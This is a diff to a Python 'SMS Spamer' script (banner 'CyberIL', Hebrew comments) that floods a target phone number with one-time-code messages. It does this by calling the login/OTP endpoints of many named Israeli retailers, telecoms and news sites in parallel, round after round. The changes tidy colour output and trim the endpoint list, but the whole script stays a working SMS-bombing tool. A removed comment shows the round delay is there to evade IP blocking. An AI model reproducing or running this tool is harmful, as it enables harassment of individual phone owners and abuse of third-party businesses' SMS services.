@@ -15,19 +15,20 @@ try:
     W = Fore.WHITE
     Y = Fore.YELLOW
     B = Style.BRIGHT
+    RESET = Style.RESET_ALL # הוספתי את ההגדרה כאן
 except ImportError:
-    R = G = C = W = Y = B = ""
+    R = G = C = W = Y = B = RESET = "" # וגם כאן למקרה שאין colorama
 
-# באנר פתיחה בעיצוב Cyber
-BANNER = f"""
-{C}{B}  _____       _               _____ _      
+# באנר פתיחה בעיצוב Cyber - הוספתי r לפני המירכאות כדי למנוע SyntaxWarning
+BANNER = r"""
+  _____       _               _____ _      
  / ____|     | |             |_   _| |     
 | |    _   _ | |__   ___ _ __  | | | |     
 | |   | | | || '_ \ / _ \ '__| | | | |     
 | |___| |_| || |_) |  __/ |   _| |_| |____ 
  \_____\__, ||_.__/ \___|_|  |_____|______|
         __/ |                              
-       |___/   {W}SMS Spamer v3.0 | By Asaf{RESET}
+       |___/   SMS Spamer v3.0 | By Asaf
 """
 
 USER_AGENTS = [
@@ -55,34 +56,27 @@ def api_call(url, data=None, method="POST", is_json=True):
         return False
 
 async def fire_round(phone):
-    # כל ה-APIs שביקשת כולל החדשים
     tasks = [
-        # סלקום (PUT)
+        # סלקום
         asyncio.to_thread(api_call, "https://digital-api.cellcom.co.il/api/otp/LoginStep1", {"Subscriber": phone, "IsExtended": False, "ProcessType": "", "OtpOrigin": "main OTP"}, method="PUT"),
         # MyOfer
         asyncio.to_thread(api_call, "https://server.myofer.co.il/api/sendAuthSms", {"phoneNumber": phone}),
-        # אופנה (Magento/Form Data)
+        # אופנה
         asyncio.to_thread(api_call, "https://www.nine-west.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
         asyncio.to_thread(api_call, "https://www.timberland.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
-        asyncio.to_thread(api_call, "https://www.fixfixfixfix.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
-        asyncio.to_thread(api_call, "https://www.intima-il.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
-        asyncio.to_thread(api_call, "https://www.gali.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
         asyncio.to_thread(api_call, "https://www.aldoshoes.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
-        # אוכל
+        # אוכל וכללי
         asyncio.to_thread(api_call, "https://app.burgeranch.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
-        asyncio.to_thread(api_call, "https://www.papajohns.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
-        # גלובס וחמ"ל
         asyncio.to_thread(api_call, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx", {"value": phone, "value_type": "154"}, is_json=False),
         asyncio.to_thread(api_call, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
         asyncio.to_thread(api_call, f"https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/{phone}", method="GET")
     ]
-    
     results = await asyncio.gather(*tasks)
     return sum(1 for r in results if r is True), len(tasks)
 
 async def main():
     os.system('cls' if os.name == 'nt' else 'clear')
-    print(BANNER)
+    print(f"{C}{B}{BANNER}{RESET}")
     
     target = input(f"{Y}[?] הכנס מספר טלפון יעד (05XXXXXXXX): {W}")
     if len(target) != 10 or not target.isdigit():
@@ -105,7 +99,6 @@ async def main():
         print(f"{W}[{timestamp}] {G}שוגרו בהצלחה: {success}/{total}")
         
         if datetime.now() < end_time:
-            # המתנה בין סבבים למניעת חסימת IP ב-Termux
             await asyncio.sleep(45)
 
     print(f"\n{C}[*] הסתיים! תודה שהשתמשת ב-CyberIL.")
